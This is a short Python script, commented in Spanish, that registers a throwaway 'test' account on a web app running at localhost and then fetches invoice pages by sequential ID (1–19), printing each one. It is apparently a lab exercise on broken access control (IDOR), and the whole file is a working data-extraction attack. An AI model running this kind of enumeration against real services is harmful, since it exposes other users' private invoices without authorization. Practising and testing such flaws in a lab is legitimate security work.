import requests, signal, sys, time


#CTRL+C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "http://127.0.0.1:5012/"

def extraer_facturas(session):
    for i in range(1, 20):
        r = session.get(url + "ver_factura/" + str(i))
        print(r.text)
        if r.status_code == 200:
            print(f"[+] Factura {i} encontrada")

def registrarme():
    data = {
        "username": "test",
        "password": "test"
    }

    session = requests.Session()
    r = session.post(url + "register", data=data, timeout=3)
    return session

    

if __name__ == '__main__':
    session = registrarme()
    extraer_facturas(session)
